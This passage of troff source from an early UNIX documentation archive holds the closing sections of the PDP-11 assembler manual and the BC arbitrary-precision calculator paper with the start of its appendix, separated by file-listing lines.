numerically larger type
(not that this fact is very useful, since the values are not made public).
An ``other type'' combined with an explicitly
discussed type other than absolute
acts like an absolute.
.pg
Further rules applying to particular operators
are:
.sp
.in 7
.ta 3 7
.ti 0
	+	If one operand is text-, data-, or bss-segment
relocatable, or is an undefined external,
the result has the postulated type and the other operand
must be absolute.
.pg
.ti 0
	_	If the first operand is a relocatable
text-, data-, or bss-segment symbol, the second operand
may be absolute (in which case the result has the
type of the first operand);
or the second operand may have the same type
as the first (in which case the result is absolute).
If the first operand is external undefined, the second must be
absolute.
All other combinations are illegal.
.pg
.ti 0
	^	This operator follows no other rule than
that the result has the value
of the first operand and the type of the second.
.pg
.ti 0
	others	It is illegal to apply these operators to any but absolute
symbols.
.in 0
.ul
7.  Pseudo-operations
.et
The keywords listed below introduce
state%ments which generate data in unusual forms or
influence the later operations of the assembler.
The metanotation
.pg
	[ stuff ] .\|.\|.
.pg
means that 0 or more instances of the given stuff may appear.
Also, boldface tokens are literals, italic words
are substitutable.
.ms
7.1  \fB.byte  \fIexpression  \fR[  \fB, \fIexpression \fR]  .\|.\|.
.pg
The \fIexpression\fRs in the comma-separated
list are truncated to 8 bits and assembled in successive
bytes.
The expressions must be absolute.
This state%ment and the string state%ment above are the only ones
which assemble data one byte at at time.
.ms
7.2  \fB.even\fR
.pg
If the location counter ``\|\fB.\fP\|'' is odd, it is advanced by one
so the next state%ment will be assembled
at a word boundary.
.ms
7.3  \fB.if  \fIexpression\fR
.pg
The \fIexpression\fR must be absolute and defined in pass 1.
If its value is nonzero, the \fB.if\fR is ignored; if zero,
the state%ments between the \fB.if\fR and the matching \fB.endif\fR
(below) are ignored.
.li
\fB.if\fR may be nested.
The effect of \fB.if\fR cannot extend beyond
the end of the input file in which it appears.
(The state%ments are not totally ignored, in
the following
sense: \fB.if\fRs and \fB.endif\fRs are scanned for, and
moreover all names
are entered in the symbol table.
Thus names occurring only inside
an \fB.if\fR
will show up as undefined if the symbol
table is listed.)
.ms
7.4  \fB.endif\fR
.pg
This state%ment marks the end of a conditionally-assembled section of code.
See \fB.if\fR above.
.ms
7.5  \fB.globl  \fIname  \fR[  \fB,\fI  name  \fR]  .\|.\|.
.pg
This state%ment makes the \fInames\fR external.
If they are otherwise defined (by assignment or
appearance as a label)
they act within the assembly exactly as if
the \fB.globl\fR state%ment were not given; however,
the link editor \fIld\fR may be used
to combine this routine with other routines that refer
these symbols.
.pg
Conversely, if the given symbols are not defined
within the current assembly, the link editor
can combine the output of this assembly
with that of others which define the symbols.
.pg
As discussed in \(sc1, it is possible to force
the assembler to make all otherwise
undefined symbols external.
.ms
.ne 5
7.6  \fB.text\fR
.br
7.7  \fB.data\fR
.br
7.8  \fB.bss\fR
.br
.pg
These three pseudo-operations cause the
assembler to begin assembling into the text, data, or
bss segment respectively.
Assembly starts in the text segment.
It is forbidden to assemble any
code or data into the bss segment, but symbols may
be defined and ``\|\fB.\fP\|'' moved about by assignment.
.ms
7.9  \fB.comm\fI  name  \fB,  \fIexpression\fR
.pg
Provided the \fIname\fR is not defined elsewhere,
this state%ment is equivalent to
.pg
.ti 6
.li
.globl  name
.ti 6
name = expression ^ name
.pg
That is, the type of \fIname\fR
is ``undefined external'', and its value is \fIexpression\fR.
In fact the \fIname\fR behaves
in the current assembly just like an
undefined external.
However, the link-editor \fIld\fR has been special-cased
so that all external symbols which are not
otherwise defined, and which have a non-zero
value, are defined to lie in the bss
segment, and enough space is left after the
symbol to hold \fIexpression\fR
bytes.
All symbols which become defined in this way
are located before all the explicitly defined
bss-segment locations.
.ul
8.   Machine instructions
.et
Because of the rather complicated instruction and addressing
structure of the \s8PDP\s10-11, the syntax of machine instruction
state%ments is varied.
Although the following sections give the syntax
in detail, the 11/20 and 11/45 handbooks should
be consulted on the semantics.
.ms
8.1  Sources and Destinations
.pg
The syntax of general source and destination
addresses is the same.
Each must have one of the following forms,
where \fIreg\fR is a register symbol, and \fIexpr\fR
is any sort of expression:
.sp
.ne 17
.nf
.ta .75i 1.825i 2.75i
	syntax	words	mode
.ta .75i 2.75i+\w'0+reg'u
.lc \(ru
8	\(ru9
.ft R
.ta  .75i 2.0i 2.75i
	\fIreg\fR	0	0+\fIreg\fB
	(\|\fIreg\fB\|)\|+	\fR0	2+\fIreg\fB
	_\|(\|\fIreg\fB\|)	\fR0	4+\fIreg\fR
	\fIexpr\|\fB(\|\fIreg\fB\|)	\fR1	6+\fIreg\fB
	(\|\fIreg\fB\|)	\fR0	1+\fIreg\fB
	*\|\fIreg\fB	\fR0	1+\fIreg\fB
	*\|(\|\fIreg\fB\|)\|+	\fR0	3+\fIreg\fB
	*\|_\|(\|\fIreg\fB\|)	\fR0	5+\fIreg\fB
	*\|(\|\fIreg\fB\|)	\fR1	7+\fIreg\fB
	*\|\fIexpr\fB\|(\|\fIreg\fB\|)	\fR1	7+\fIreg\fB
	\fIexpr	\fR1	67
	\fB$\|\fIexpr	\fR1	27
	\fB*\|\fIexpr	\fR1	77
	\fB*\|$\|\fIexpr	\fR1	37
.sp
.fi
The \fIwords\fR column gives the number of address words generated;
the \fImode\fR column gives the octal address-mode number.
The syntax of the address forms is
identical to that in \s8DEC\s10 assemblers, except that ``*'' has
been substituted for ``@''
and ``$'' for ``#''; the \s8UNIX\s10 typing conventions make ``@'' and ``#''
rather inconvenient.
.br
.pg
Notice that mode ``*reg'' is identical to ``(reg)'';
that ``*(reg)'' generates an index word (namely, 0);
and that addresses consisting of an unadorned expression
are assembled as pc-relative ref%er%ences independent
of the type of the expression.
To force a non-relative ref%er%ence, the form ``*$expr'' can
be used, but notice that further indirection is impossible.
.ms
8.3  Simple machine instructions
.pg
The following instructions
are defined as absolute symbols:
.pg
.ta 1i 2.5i 3i
.ne  8
.nf
.ft B
	clc
	clv
	clz
	cln
	sec
	sev
	sez
	sen
.pg
.fi
.ft R
They therefore require
no special syntax.
The \s8PDP\s10-11 hardware allows more than one of the ``clear''
class, or alternatively more than one of the ``set'' class
to be \fBor\fR-ed together; this may be expressed as follows:
.pg
	clc\|\|\|\(bv\|\|clv
.ms
8.4  Branch
.pg
The following instructions take an expression as operand.
The expression must lie in the same segment as the ref%er%ence,
cannot be undefined-external,
and its value cannot differ from the current location of ``\|\fB.\fP\|''
by more than 254 bytes:
.pg
.ne 10
.nf
.ft B
	br	blos
	bne	bvc
	beq	bvs
	bge	bhis
	blt	bec	\fR(=\fB bcc\fR)\fB
	bgt	bcc
	ble	blo
	bpl	bcs
	bmi	bes	\fR(=\fB bcs\fR)\fB
	bhi
.pg
.fi
.ft R
\fBbes\fR (``branch on error set'')
and \fBbec\fR (``branch on error clear'')
are intended to test the error bit
returned by system calls (which
is the c-bit).
.ms
8.5   Extended branch instructions
.pg
The following symbols are followed by an expression
representing an address
in the same segment as ``\|\fB.\|\fP''.
If the target address is close enough,
a branch-type instruction is generated;
if the address is too far away,
a \fBjmp\fR will be used.
.pg
.ne 10
.nf
.ft B
	jbr	jlos
	jne	jvc
	jeq	jvs
	jge	jhis
	jlt	jec
	jgt	jcc
	jle	jlo
	jpl	jcs
	jmi	jes
	jhi
.pg
.fi
.ft R
\fBjbr\fR turns into a plain \fBjmp\fR
if its target is too remote;
the others (whose names are contructed
by replacing the ``b'' in the branch instruction's
name by ``j''\|)
turn into the converse branch over a \fBjmp\fR
to the target address.
.ms
8.6  Single operand instructions
.pg
The following
symbols are names of single-operand
machine instructions.
The form
of address expected is discussed in \(sc8.1 above.
.pg
.ft B
.nf
	clr	sbcb
	clrb	ror
	com	rorb
	comb	rol
	inc	rolb
	incb	asr
	dec	asrb
	decb	asl
	neg	aslb
	negb	jmp
	adc	swab
	adcb	tst
	sbc	tstb
.br
.ft R
.fi
.ms
8.7  Double operand instructions
.pg
The following instructions take a general source
and destination (\(sc8.1), separated by a comma, as operands.
.pg
.ne 12
.ft B
.nf
	mov
	movb
	cmp
	cmpb
	bit
	bitb
	bic
	bicb
	bis
	bisb
	add
	sub
.fi
.ft R
.ms
8.8  Miscellaneous instructions
.pg
The following instructions have
more specialized syntax.
Here \fIreg\fR is
a register name, \fIsrc\fR and \fIdst\fR a general source
or destination
(\(sc8.1), and \fIexpr\fR is an expression:
.pg
.nf
.ta 1.0i 1.5i 3i
\fB	jsr\fI	reg,dst
\fB	rts\fI	reg
\fB	sys\fI	expr
.ft B
	ash	\fIsrc\|,\|reg	\fR(or, \fBals\fR)\fB
	ashc	\fIsrc\|,\|reg	\fR(or, \fBalsc\fR)\fB
	mul	\fIsrc\|,\|reg	\fR(or, \fBmpy\fR)\fB
	div	\fIsrc\|,\|reg	\fR(or, \fBdvd\fR)\fR
\fB	xor	\fIreg\|,\|dst\fB
	sxt	\fIdst\fB
	mark	\fIexpr\fB
	sob	\fIreg\|,\|expr\fB
.pg
.ft R
.fi
\fBsys\fR is another name for the \fBtrap\fR instruction.
It is used to code system calls.
Its operand is required to be expressible in 6 bits.
The alternative forms for \fBash\fR, \fBashc\fR, \fBmul\fR, and \fBdiv\fR
are provided to avoid conflict with \s8EAE\s10 register
names should they be needed.
.pg
The expression in \fBmark\fR must be expressible
in six bits, and the expression in \fBsob\fR must
be in the same segment as ``\fB\|.\|\fR'',
must not be external-undefined, must be less than ``\|\fB.\fR\|'',
and must be within 510 bytes of ``\|\fB.\fR\|''.
.ms
8.9  Floating-point unit instructions
.pg
The following floating-point operations are defined,
with syntax as indicated:
.pg
.nf
\fB	cfcc
\fB	setf
\fB	setd
\fB	seti
\fB	setl
\fB	clrf	\fIfdst
\fB	negf	\fIfdst
\fB	absf	\fIfdst
\fB	tstf	\fIfsrc
\fB	movf	\fIfsrc,\|freg	\fR(= ldf\fR\|)
\fB	movf	\fIfreg,\|fdst	\fR(= stf\fR\|)
\fB	movif	\fIsrc,\|freg	\fR(= ldcif\fR\|)
\fB	movfi	\fIfreg,\|dst	\fR(= stcfi\fR\|)
\fB	movof	\fIfsrc,\|freg	\fR(= ldcdf\fR\|)
\fB	movfo	\fIfreg,\|fdst	\fR(= stcfd\fR\|)
\fB	movie	\fIsrc,\|freg	\fR(= ldexp\fR)
\fB	movei	\fIfreg,\|dst	\fR(= stexp\fR)
\fB	addf	\fIfsrc,\|freg
\fB	subf	\fIfsrc,\|freg
\fB	mulf	\fIfsrc,\|freg
\fB	divf	\fIfsrc,\|freg
\fB	cmpf	\fIfsrc,\|freg
\fB	modf	\fIfsrc,\|freg
\fB	ldfps	\fIsrc
\fB	stfps	\fIdst
\fB	stst	\fIdst
.fi
.ft R
.pg
\fIfsrc\fR, \fIfdst\fR, and \fIfreg\fR mean floating-point
source, destination, and register respectively.
Their syntax is identical to that for
their non-floating counterparts, but
note that only
floating registers 0_3 can be a \fIfreg\fR.
.pg
The names of several of the operations
have been changed to bring out an analogy with
certain fixed-point instructions.
The only strange case is \fBmovf\fR, which turns into
either \fBstf\fR or \fBldf\fR
depending respectively on whether its first operand is
or is not a register.
Warning:  \fBldf\fR sets the floating condition codes,
\fBstf\fR does not.
.ul
9.  Other symbols
.et
.ti 0
9.1  \fB.\|.\fR
.pg
The symbol ``\fB\|.\|.\|\fR''
is the
\fIrelocation counter\fR.
Just before each assembled word is placed in the output stream,
the current value of this symbol is added to the word
if the word refers to a text, data or bss segment location.
If the output word is a pc-relative address word
which refers to an absolute location,
the value of ``\fB\|.\|.\|\fR'' is subtracted.
.pg
Thus the value of ``\fB\|.\|.\|\fR'' can be taken to mean
the starting core location of the program.
In \s8UNIX\s10 systems with relocation hardware,
the initial value of ``\|\fB.\|.\fR\|'' is 0.
.pg
The value of ``\|\fB.\|.\fR\|'' may be changed by assignment.
Such a course of action is sometimes
necessary, but the consequences
should be carefully thought out.
It is particularly ticklish
to change ``\|\fB.\|.\fR\|'' midway in an assembly
or to do so in a program which will
be treated by the loader, which has
its own notions of ``\|\fB.\|.\fR\|''.
.ms
9.2  System calls
.pg
The following absolute
symbols may be used to code calls to the \s8UNIX\s10 system
(see the \fBsys\fR instruction above).
.pg
.ft B
.nf
.ta 1i 2.5i
	break	nice
	chdir	open
	chmod	read
	chown	seek
	close	setuid
	creat	signal
	exec	stat
	exit	stime
	fork	stty
	fstat	tell
	getuid	time
	gtty	umount
	link	unlink
	makdir	wait
	mdate	write
	mount
.fi
.ft R
.pg
Warning: the \fBwait\fR system call is not the same
as the \fBwait\fR instruction, which is not defined
in the assembler.
.ul
10.  Diagnostics
.et
When
an input file cannot be read, its name
followed by a question mark is typed and assembly
ceases.
When syntactic or semantic errors occur, a single-character diagnostic is typed out
together with the line number and the file name in which it
occurred.  Errors in pass 1 cause cancellation of pass 2.
The possible errors are:
.sp
.nf
.ta .5i .8i
	)	 parentheses error
	]	 parentheses error
	>	 string not terminated properly
	*	 indirection (\|*\|) used illegally
	\fB.\fR	 illegal assignment to ``\|\fB.\fP\|''
\s8	A\s10	 error in address
\s8	B\s10	 branch address is odd or too remote
\s8	E\s10	 error in expression
\s8	F\s10	 error in local (``f\|'' or ``b'') type symbol
\s8	G\s10	 garbage (unknown) character
\s8	I\s10	 end of file inside an \fB.if\fR
\s8	M\s10	 multiply defined symbol as label
\s8	O\s10	 word quantity assembled at odd address
\s8	P\s10	 phase error_ ``\|\fB.\fP\|'' different in pass 1 and 2
\s8	R\s10	 relocation error
\s8	U\s10	 undefined symbol
\s8	X\s10	 syntax error
.fi
-- /usr/doc/bc mode=0140775 uid=3 gid=3 atime=173059613 mtime=173059506 --
-- /usr/doc/bc/bc mode=0110664 uid=3 gid=3 atime=173059376 mtime=173059614 --
.RP
.TL
BC \- An Arbitrary Precision Desk-Calculator Language
.AU
Lorinda Cherry
.AU
Robert Morris
.AI
.MH
.AB
BC is a language and a compiler for doing arbitrary precision arithmetic
on the PDP-11 under the UNIX time-sharing
system.  The output of the compiler is interpreted and executed by
a collection of routines which can input, output, and do
arithmetic on indefinitely large integers and on scaled fixed-point
numbers.
.PP
These routines are themselves based on a dynamic storage allocator.
Overflow does not occur until all available core storage
is exhausted.
.PP
The language has a complete control structure as well as immediate-mode
operation.  Functions can be defined and saved for later execution.
.PP
Two five hundred-digit numbers can be multiplied to give a
thousand digit result in about ten seconds.
.PP
A small collection of library functions is also available,
including sin, cos, arctan, log, exponential, and Bessel functions of
integer order.
.PP
Some of the uses of this compiler are
.IP \-
to do computation with large integers,
.IP \-
to do computation accurate to many decimal places,
.IP \-
conversion of numbers from one base to another base.
.AE
.PP
.SH
Introduction
.PP
BC is a language and a compiler for doing arbitrary precision
arithmetic on the UNIX time-sharing system [1].
The compiler was written to make conveniently available a
collection of routines (called DC [6]) which are capable of doing
arithmetic on integers of arbitrary size.  The compiler
is by no means intended to provide a complete programming
language.
It is a minimal language facility.
.PP
There is a scaling provision that permits the
use of decimal point notation.
Provision is made for input and output in bases other than
decimal.  Numbers can be converted from decimal to octal by
simply setting the output base to equal 8.
.PP
The actual limit on the number of digits that can
be handled depends on the amount of storage available on the machine.
Manipulation of numbers with many hundreds of digits
is possible even on the smallest versions of UNIX.
.PP
The syntax of BC has been deliberately selected to agree
substantially with the C language [2,3].  Those who
are familiar with C will find few surprises in this language.
.SH
Simple Computations with Integers
.PP
The simplest kind of statement is an arithmetic expression
on a line by itself.
For instance, if you type in the line:
.DS
142857 + 285714
.DE
the program responds immediately with the line
.DS
428571
.DE
The operators \-, *, /, %, and ^ can also be used; they
indicate subtraction, multiplication, division, remaindering, and
exponentiation, respectively.  Division of integers produces an
integer result truncated toward zero.
Division by zero produces an error
comment.
.PP
Any term in an expression may be prefixed by a minus sign to
indicate that it is to be negated (the `unary' minus sign).
The expression
.DS
7+\-3
.DE
is interpreted to mean that \-3 is to be added to 7.
.PP
More complex expressions with several operators and with
parentheses are interpreted just as in
Fortran, with ^ having the greatest binding
power, then * and % and /, and finally + and \-.
Contents of parentheses are evaluated before material
outside the parentheses.
Exponentiations are
performed from right to left and the other operators
from left to right.
The two expressions
.DS
a^b^c  and  a^(b^c)
.DE
are equivalent, as are the two expressions
.DS
a*b*c  and  (a*b)*c
.DE
BC shares with Fortran and C the undesirable convention that
.DS
a/b*c  is equivalent to  (a/b)*c
.DE
.PP
Internal storage registers to hold numbers have single lower-case
letter names.  The value of an expression can be assigned to
a register in the usual way.  The statement
.DS
x = x + 3
.DE
has the effect of increasing by three the value of the contents of the
register named x.
When, as in this case, the outermost operator is an =, the
assignment is performed but the result is not printed.
Only 26 of these named storage registers are available.
.PP
There is a built-in square root function whose
result is truncated to an integer (but see scaling below).
The lines
.DS
x = sqrt(191)
x
.DE
produce the printed result
.DS
13
.DE
.SH
Bases
.PP
There are special internal quantities, called `ibase' and `obase'.
The contents of `ibase', initially set to 10,
determines the base used for interpreting numbers read in.
For example, the lines
.DS
ibase = 8
11
.DE
will produce the output line
.DS
9
.DE
and you are all set up to do octal to decimal conversions.
Beware, however of trying to change the input base back
to decimal by typing
.DS
ibase = 10
.DE
Because the number 10 is interpreted as octal, this statement will
have no effect.
For those who deal in hexadecimal notation,
the characters A\-F are permitted in numbers
(no matter what base is in effect)
and are
interpreted as digits having values 10\-15 respectively.
The statement
.DS
ibase = A
.DE
will change you back to decimal input base no matter what the
current input base is.
Negative and large positive input bases are
permitted but useless.
No mechanism has been provided for the input of arbitrary
numbers in bases less than 1 and greater than 16.
.PP
The contents of `obase', initially set to 10, are used as the base for output
numbers.  The lines
.DS
obase = 16
1000
.DE
will produce the output line
.DS
3E8
.DE
which is to be interpreted as a 3-digit hexadecimal number.
Very large output bases are permitted, and they are sometimes useful.
For example, large numbers can be output in groups of five digits
by setting `obase' to 100000.
Strange (i.e. 1, 0, or negative) output bases are
handled appropriately.
.PP
Very large numbers are split across lines with 70 characters per line.
Lines which are continued end with \\.
Decimal output conversion is practically instantaneous, but output
of very large numbers (i.e., more than 100 digits) with other bases
is rather slow.
Non-decimal output conversion of
a one hundred digit number takes about
three seconds.
.PP
It is best to remember that `ibase' and `obase' have no effect
whatever on the course of internal computation or
on the evaluation of expressions, but only affect input and
output conversion, respectively.
.SH
Scaling
.PP
A third special internal quantity called `scale' is
used to determine the scale of calculated
quantities.
Numbers may have
up to 99 decimal digits after the decimal point.
This fractional part is retained in further computations.
We refer to the number of digits after the decimal point of
a number as its scale.
.PP
When two scaled numbers are combined by
means of one of the arithmetic operations, the result
has a scale determined by the following rules.  For
addition and subtraction, the scale of the result is the larger
of the scales of the two operands.  In this case,
there is never any truncation of the result.
For multiplications, the scale of the result is never
less than the maximum of the two scales of the operands,
never more than the sum of the scales of the operands
and, subject to those two restrictions,
the scale of the result is set equal to the contents of the internal
quantity `scale'.
The scale of a quotient is the contents of the internal
quantity `scale'.  The scale of a remainder is
the sum of the scales of the quotient and the divisor.
The result of an exponentiation is scaled as if
the implied multiplications were performed.
An exponent must be an integer.
The scale of a square root is set to the maximum of the scale
of the argument and the contents of `scale'.
.PP
All of the internal operations are actually carried out in terms
of integers, with digits being discarded when necessary.
In every case where digits are discarded, truncation and
not rounding is performed.
.PP
The contents of
`scale' must be no greater than
99 and no less than 0.  It is initially set to 0.
In case you need more than 99 fraction digits, you may arrange
your own scaling.
.PP
The internal quantities `scale', `ibase', and `obase' can be
used in expressions just like other variables.
The line
.DS
scale = scale + 1
.DE
increases the value of `scale' by one, and the line
.DS
scale
.DE
causes the current value of `scale' to be printed.
.PP
The value of `scale' retains its meaning as a
number of decimal digits to be retained in internal
computation even when `ibase' or `obase' are not equal to 10.
The internal computations (which are still conducted in decimal,
regardless of the bases) are performed to the specified number
of decimal digits, never hexadecimal or octal or any
other kind of digits.
.SH
Functions
.PP
The name of a function is a single lower-case letter.
Function names are permitted to collide with simple
variable names.
Twenty-six different defined functions are permitted
in addition to the twenty-six variable names.
The line
.DS
	define a(x){
.DE
begins the definition of a function with one argument.
This line must be followed by one or more statements,
which make up the body of the function, ending
with a right brace }.
Return of control from a function occurs when a return
statement is executed or when the end of the function is reached.
The return statement can take either
of the two forms
.DS
return
return(x)
.DE
In the first case, the value of the function is 0, and in
the second, the value of the expression in parentheses.
.PP
Variables used in the function can be declared as automatic
by a statement of the form
.DS
auto x,y,z
.DE
There can be only one `auto' statement in a function and it must
be the first statement in the definition.
These automatic variables are allocated space and initialized
to zero on entry to the function and thrown away on return.  The
values of any variables with the same names outside the function
are not disturbed.
Functions may be called recursively and the automatic variables
at each level of call are protected.
The parameters named in a function definition are treated in
the same way as the automatic variables of that function
with the single exception that they are given a value
on entry to the function.
An example of a function definition is
.DS
	define a(x,y){
		auto z
		z = x*y
		return(z)
	}
.DE
The value of this function, when called, will be the
product of its
two arguments.
.PP
A function is called by the appearance of its name
followed by a string of arguments enclosed in
parentheses and separated by commas.
The result
is unpredictable if the wrong number of arguments is used.
.PP
Functions with no arguments are defined and called using
parentheses with nothing between them: b().
.PP
If the function
.ft I
a
.ft
above has been defined, then the line
.DS
a(7,3.14)
.DE
would cause the result 21.98 to be printed and the line
.DS
x = a(a(3,4),5)
.DE
would cause the value of x to become 60.
.SH
Subscripted Variables
.PP
A single lower-case letter variable name
followed by an expression in brackets is called a subscripted
variable (an array element).
The variable name is called the array name and the expression
in brackets is called the subscript.
Only one-dimensional arrays are
permitted.  The names of arrays are permitted to
collide with the names of simple variables and function names.
Any fractional
part of a subscript is discarded before use.
Subscripts must be greater than or equal to zero and 
less than or equal to 2047.
.PP
Subscripted variables may be freely used in expressions, in
function calls, and in return statements.
.PP
An array name may be used as an argument to a function,
or may be declared as automatic in
a function definition by the use of empty brackets:
.DS
f(a[\|])
define f(a[\|])
auto a[\|]
.DE
When an array name is so used, the whole contents of the array
are copied for the use of the function, and thrown away on exit
from the function.
Array names which refer to whole arrays cannot be used
in any other contexts.
.SH
Control Statements
.PP
The `if', the `while', and the `for' statements
may be used to alter the flow within programs or to cause iteration.
The range of each of them is a statement or
a compound statement consisting of a collection of
statements enclosed in braces.
They are written in the following way
.DS
if(relation) statement
while(relation) statement
for(expression1; relation; expression2) statement
.DE
or
.DS
if(relation) {statements}
while(relation) {statements}
for(expression1; relation; expression2) {statements}
.DE
.PP
A relation in one of the control statements is an expression of the form
.DS
x>y
.DE
where  two expressions are related by one of the six relational
operators <, >, <=, >=, ==, or !=.
The relation ==
stands for `equal to' and != stands for `not equal to'.
The meaning of the remaining relational operators is
clear.
.PP
BEWARE of using = instead of == in a relational.  Unfortunately,
both of them are legal, so you will not get a diagnostic
message, but = really will not do a comparison.
.PP
The `if' statement causes execution of its range
if and only if the relation is true.
Then control passes to the next statement in sequence.
.PP
The `while' statement causes execution of its range
repeatedly as long as the relation
is true.  The relation is tested before each execution
of its range and if the relation
is false, control passes to the next statement beyond the range
of the while.
.PP
The `for' statement begins
by executing `expression1'.  Then the relation is tested
and, if true, the statements in the range of the `for' are executed.
Then `expression2' is executed.  The relation is tested, and so on.
The typical use of the `for' statement is for a controlled iteration,
as in the statement
.DS
for(i=1; i<=10; i=i+1) i
.DE
which will print the integers from 1 to 10.
Here are some examples of the use of the control statements.
.DS
define f(n){
auto i, x
x=1
for(i=1; i<=n; i=i+1) x=x*i
return(x)
}
.DE
The line
.DS
	f(a)
.DE
will print
.ft I
a
.ft
factorial if
.ft I
a
.ft
is a positive integer.
Here is the definition of a function which will
compute values of the binomial coefficient
(m and n are assumed to be positive integers).
.DS
define b(n,m){
auto x, j
x=1
for(j=1; j<=m; j=j+1) x=x*(n\-j+1)/j
return(x)
}
.DE
The following function computes values of the exponential function
by summing the appropriate series
without regard for possible truncation errors:
.DS
scale = 20
define e(x){
	auto a, b, c, d, n
	a = 1
	b = 1
	c = 1
	d = 0
	n = 1
	while(1==1){
		a = a*x
		b = b*n
		c = c + a/b
		n = n + 1
		if(c==d) return(c)
		d = c
	}
}
.DE
.SH
Some Details
.PP
There are some language features that every user should know
about even if he will not use them.
.PP
Normally statements are typed one to a line.  It is also permissible
to type several statements on a line separated by semicolons.
.PP
If an assignment statement is parenthesized, it then has
a value and it can be used anywhere that an expression can.
For example, the line
.DS
(x=y+17)
.DE
not only makes the indicated assignment, but also prints the
resulting value.
.PP
Here is an example of a use of the value of an
assignment statement even when it is not parenthesized.
.DS
x = a[i=i+1]
.DE
causes a value to be assigned to x and also increments i
before it is used as a subscript.
.PP
The following constructs work in BC in exactly the same manner
as they do in the C language.  Consult the appendix or the
C manuals [2,3] for their exact workings.
.DS
.ta 2i
x=y=z  is the same as	x=(y=z)
x =+ y	x = x+y
x =\- y	x = x\-y
x =* y	x = x*y
x =/ y	x = x/y
x =% y	x = x%y
x =^ y	x = x^y
x++	(x=x+1)\-1
x\-\-	(x=x\-1)+1
++x	x = x+1
\-\-x	x = x\-1
.DE
Even if you don't intend to use the constructs,
if you type one inadvertently, something correct but unexpected
may happen.
.PP
WARNING!  In some of these constructions, spaces are
significant.
There is a real difference between
x=\-y and x= \-y.
The first replaces x by x\-y and the second by \-y.
.SH
Three Important Things
.PP
1.  To exit a BC program, type `quit'.
.PP
2. There is a comment convention identical to that of C and
of PL/I.  Comments begin with `/*' and end with `*/'.
.PP
3. There is a library of math functions which may be obtained by
typing at command level
.DS
bc \-l
.DE
This command will load a set of library functions
which, at the time of writing, consists of sine (named `s'),
cosine (`c'), arctangent (`a'), natural logarithm (`l'),
exponential (`e') and Bessel functions of integer order (`j(n,x)').  Doubtless more functions will be added
in time.
The library sets the scale to 20.  You can reset it to something
else if you like.
The design of these mathematical library routines
is discussed elsewhere [4].
.PP
If you type
.DS
bc file ...
.DE
BC will read and execute the named file or files before accepting
commands from the keyboard.  In this way, you may load your
favorite programs and function definitions.
.SH
Acknowledgement
.PP
The compiler is written in YACC [5]; its original
version  was written by S. C. Johnson.
.SH
References
.IP[1]
K. Thompson and D. M. Ritchie,
.ft I
UNIX Programmer's Manual,
.ft
Fifth Edition (1974)
.IP[2]
D. M. Ritchie,
.ft I
C Reference Manual,
.ft
.IP[3]
B. W. Kernighan,
.ft I
Programming in C: A Tutorial,
.ft
.IP[4]
Robert Morris,
.ft I
A Library of Reference Standard Mathematical Subroutines,
.ft
.IP[5]
S. C. Johnson,
.ft I
YACC, Yet Another Compiler-Compiler,
.ft
.IP[6]
R. Morris and L. L. Cherry,
.ft I
DC \- An Interactive Desk Calculator,
.ft
.LP
-- /usr/doc/bc/bca mode=0110664 uid=3 gid=3 atime=173059377 mtime=173059614 --
.bp
.ft B
.DS C
Appendix
.DE
.ft
.NH
Notation
.PP
In the following pages syntactic categories are in \fIitalics\fP;
literals are in \fBbold\fP; material in brackets [\|] is optional.
.NH
Tokens
.PP
Tokens consist of keywords, identifiers, constants, operators,
and separators.
Token separators may be blanks, tabs or comments.
Newline characters or semicolons separate statements.
.NH 2
Comments
.PP
Comments are introduced by the characters /* and terminated by
*/.
.NH 2
Identifiers
.PP
There are three kinds of identifiers \- ordinary identifiers, array identifiers
and function identifiers.
All three types consist of single lower-case letters.
Array identifiers are followed by square brackets, possibly
enclosing an expression describing a subscript.
Arrays are singly dimensioned and may contain up to 2048
elements.
Indexing begins at zero so an array may be indexed from 0 to 2047.
Subscripts are truncated to integers.
Function identifiers are followed by parentheses, possibly enclosing arguments.
The three types of identifiers do not conflict;
a program can have a variable named \fBx\fP,
an array named \fBx\fP and a function named \fBx\fP, all of which are separate and
distinct.
.NH 2
Keywords
.PP
The following are reserved keywords:
.ft B
.ta .5i 1.0i
.nf
	ibase	if
	obase	break
	scale	define
	sqrt	auto
	length	return
	while	quit
	for
.fi
.ft
.NH 2
Constants
.PP
Constants consist of arbitrarily long numbers
with an optional decimal point.
The hexadecimal digits \fBA\fP\-\fBF\fP are also recognized as digits with
values 10\-15, respectively.
.NH 1
Expressions
.PP
The value of an expression is printed unless the main
operator is an assignment.
Precedence is the same as the order
of presentation here, with highest appearing first.
Left or right associativity, where applicable, is
discussed with each operator.
.bp
.NH 2
Primitive expressions
.NH 3
Named expressions
.PP
Named expressions are
places where values are stored.
Simply stated,
named expressions are legal on the left
side of an assignment.
The value of a named expression is the value stored in the place named.
.NH 4
\fIidentifiers\fR
.PP
Simple identifiers are named expressions.
They have an initial value of zero.
.NH 4
\fIarray-name\fP\|[\|\fIexpression\fP\|]
.PP
Array elements are named expressions.
They have an initial value of zero.
.NH 4
\fBscale\fR, \fBibase\fR and \fBobase\fR
.PP
The internal registers
\fBscale\fP, \fBibase\fP and \fBobase\fP are all named expressions.
\fBscale\fP is the number of digits after the decimal point to be
retained in arithmetic operations.
\fBscale\fR has an initial value of zero.
\fBibase\fP and \fBobase\fP are the input and output number
radix respectively.
Both \fBibase\fR and \fBobase\fR have initial values of 10.
.NH 3
Function calls
.NH 4
\fIfunction-name\fB\|(\fR[\fIexpression\fR\|[\fB,\|\fIexpression\|\fR.\|.\|.\|]\|]\fB)
.PP
A function call consists of a function name followed by parentheses
containing a comma-separated list of
expressions, which are the function arguments.
A whole array passed as an argument is specified by the
array name followed by empty square brackets.
All function arguments are passed by
value.
As a result, changes made to the formal parameters have
no effect on the actual arguments.
If the function terminates by executing a return
statement, the value of the function is
the value of the expression in the parentheses of the return
statement or is zero if no expression is provided
or if there is no return statement.
.NH 4
sqrt\|(\|\fIexpression\fP\|)
.PP
The result is the square root of the expression.
The result is truncated in the least significant decimal place.
The scale of the result is
the scale of the expression or the
value of
.ft B
scale,
.ft
whichever is larger.
.NH 4
length\|(\|\fIexpression\fP\|)
.PP
The result is the total number of significant decimal digits in the expression.
The scale of the result is zero.
.NH 4
scale\|(\|\fIexpression\fP\|)
.PP
The result is the scale of the expression.
The scale of the result is zero.
.NH 3
Constants
.PP
Constants are primitive expressions.
.NH 3
Parentheses
.PP
An expression surrounded by parentheses is
a primitive expression.
The parentheses are used to alter the
normal precedence.
.NH 2
Unary operators
.PP
The unary operators
bind right to left.
.NH 3
\-\|\fIexpression\fP
.PP
The result is the negative of the expression.
.NH 3
++\|\fInamed-expression\fP
.PP
The named expression is
incremented by one.
